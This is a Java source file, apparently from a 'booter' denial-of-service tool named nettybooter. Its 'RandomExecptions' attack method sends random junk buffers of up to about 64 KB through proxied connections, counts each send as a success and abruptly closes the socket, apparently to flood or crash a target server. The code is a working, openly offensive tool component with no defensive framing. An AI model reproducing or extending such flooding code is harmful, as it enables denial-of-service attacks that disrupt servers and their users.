package me.nzxtercode.nettybooter.methods.impl;

import java.util.concurrent.ThreadLocalRandom;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelOption;
import me.nzxtercode.nettybooter.methods.interfaces.IMethod;
import me.nzxtercode.nettybooter.proxy.Proxy;
import me.nzxtercode.nettybooter.utils.NettyBootstrap;

/**
 * The type Random execptions.
 */
public class RandomExecptions implements IMethod {

	public void accept(Channel channel, Proxy proxy) {
		byte[] bytes = new byte[5 + ThreadLocalRandom.current().nextInt(65534)];
		ThreadLocalRandom.current().nextBytes(bytes);
		channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
		NettyBootstrap.service.success++;
		if (ThreadLocalRandom.current().nextBoolean())
			channel.config().setOption(ChannelOption.SO_LINGER, 1);
		channel.close();
	}
}
